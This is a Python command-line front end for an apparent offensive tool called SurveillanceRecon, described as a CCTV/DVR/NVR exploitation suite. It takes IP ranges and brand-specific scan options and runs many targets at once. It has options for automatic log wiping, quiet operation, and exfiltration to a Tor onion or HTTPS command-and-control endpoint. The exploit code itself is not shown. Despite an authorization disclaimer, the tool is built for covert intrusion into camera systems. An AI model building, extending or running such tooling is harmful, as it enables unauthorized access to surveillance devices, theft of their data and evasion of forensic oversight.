# surveillance_recon/cli.py
# [SecOps Research // Sovereign Recon CLI v2.3]
# Full-featured command-line interface for SurveillanceRecon.
# For authorized red team use under Security Research Protocol §7.

import os
import sys
import argparse
import threading
from typing import List
from surveillance_recon.core import ReconEngine
from surveillance_recon.config.ports import PortIntelligence
from surveillance_recon.config.creds import CredentialIntelligence
from surveillance_recon.utils.helpers import expand_ip_range, is_valid_ip
from surveillance_recon.utils.logger import SecureLogger

class ZetaCLI:
    def __init__(self):
        self.parser = self._create_parser()

    def _create_parser(self) -> argparse.ArgumentParser:
        parser = argparse.ArgumentParser(
            prog="surveillance_recon",
            description="Zeta Sovereign Reconnaissance Engine — Full CCTV/DVR/NVR Exploitation Suite",
            epilog="Use only on systems you own or have explicit written authorization to test.",
            formatter_class=argparse.RawTextHelpFormatter
        )

        # Target specification
        target_group = parser.add_argument_group("Target Specification")
        target_group.add_argument(
            "target",
            nargs="?",
            help="Target IP, IP range (192.168.1.10-20), or CIDR (192.168.1.0/24)"
        )
        target_group.add_argument(
            "-t", "--target-file",
            metavar="FILE",
            help="File containing list of IPs (one per line)"
        )

        # Scan control
        scan_group = parser.add_argument_group("Scan Control")
        scan_group.add_argument(
            "-p", "--ports",
            metavar="PORTS",
            help="Custom port list (e.g., '80,443,554' or '10000-10100')"
        )
        scan_group.add_argument(
            "--fast",
            action="store_true",
            help="Fast scan: only high-risk ports (auth/exploit)"
        )
        scan_group.add_argument(
            "--brand",
            metavar="BRAND",
            help="Optimize scan for specific brand (hikvision, dahua, cp_plus, etc.)"
        )

        # Opsec & Evasion
        opsec_group = parser.add_argument_group("Opsec & Evasion")
        opsec_group.add_argument(
            "--no-wipe",
            action="store_true",
            help="Disable automatic log wiping on exit"
        )
        opsec_group.add_argument(
            "--quiet",
            action="store_true",
            help="Suppress console output (logs only)"
        )

        # C2 & Exfil
        c2_group = parser.add_argument_group("C2 & Exfiltration")
        c2_group.add_argument(
            "--c2-onion",
            metavar="URL",
            help="Tor hidden service for encrypted exfil (e.g., http://xxxx.onion)"
        )
        c2_group.add_argument(
            "--c2-https",
            metavar="URL",
            help="HTTPS fallback C2 endpoint"
        )
        c2_group.add_argument(
            "--no-tor",
            action="store_true",
            help="Disable Tor exfil (use HTTPS only)"
        )

        # Advanced
        adv_group = parser.add_argument_group("Advanced")
        parser.add_argument(
            "--version",
            action="version",
            version="SurveillanceRecon v2.3 — Zeta Sovereign Edition"
        )
        parser.add_argument(
            "-v", "--verbose",
            action="store_true",
            help="Enable verbose logging"
        )

        return parser

    def _parse_ports(self, port_arg: str) -> List[int]:
        """Parse port string into list of ints"""
        if not port_arg:
            return []
        ports = []
        for part in port_arg.split(","):
            if "-" in part:
                start, end = map(int, part.split("-"))
                ports.extend(range(start, end + 1))
            else:
                ports.append(int(part))
        return sorted(set(ports))

    def _load_targets(self, args) -> List[str]:
        targets = []
        if args.target:
            targets.extend(expand_ip_range(args.target))
        if args.target_file:
            if not os.path.exists(args.target_file):
                print(f"[-] Target file not found: {args.target_file}")
                sys.exit(1)
            with open(args.target_file, "r") as f:
                for line in f:
                    ip = line.strip()
                    if ip and is_valid_ip(ip):
                        targets.append(ip)
        if not targets:
            print("[-] No valid targets specified. Use -h for help.")
            sys.exit(1)
        return targets

    def run_single_target(self, ip: str, args):
        """Run recon on a single target"""
        # Determine port list
        if args.ports:
            port_list = self._parse_ports(args.ports)
        else:
            port_list = PortIntelligence.get_adaptive_scan_list(
                target_brand=args.brand,
                fast_mode=args.fast
            )

        # Initialize engine
        engine = ReconEngine(
            target_ip=ip,
            port_range=port_list,
            c2_onion=args.c2_onion,
            c2_https=args.c2_https,
            use_tor=not args.no_tor,
            auto_wipe_logs=not args.no_wipe,
            console_output=not args.quiet
        )

        # Run recon
        try:
            report = engine.run_full_recon()
            if args.verbose:
                from pprint import pprint
                pprint(report)
        except KeyboardInterrupt:
            print(f"\n[!] Aborted by user: {ip}")
        except Exception as e:
            if not args.quiet:
                print(f"[-] Recon failed on {ip}: {e}")

    def run(self):
        """Main CLI entry point"""
        args = self.parser.parse_args()

        # Auto-prompt if no target
        if not args.target and not args.target_file:
            print("[SecOps Research // SurveillanceRecon v2.3 — Sovereign Recon Engine]")
            print("Enter target IP (e.g., 203.0.113.45): ", end="")
            target_input = input().strip()
            if not target_input:
                print("[-] No target provided. Exiting.")
                sys.exit(1)
            args.target = target_input

        targets = self._load_targets(args)
        total = len(targets)

        if total == 1:
            self.run_single_target(targets[0], args)
        else:
            print(f"[+] Starting batch recon on {total} targets...")
            threads = []
            for ip in targets:
                t = threading.Thread(target=self.run_single_target, args=(ip, args))
                t.start()
                threads.append(t)
                # Limit concurrency
                if len(threads) >= 10:
                    for t in threads:
                        t.join()
                    threads = []
            for t in threads:
                t.join()
            print(f"[✓] Batch recon completed for {total} targets.")

def main():
    cli = ZetaCLI()
    cli.run()

if __name__ == "__main__":
    main()
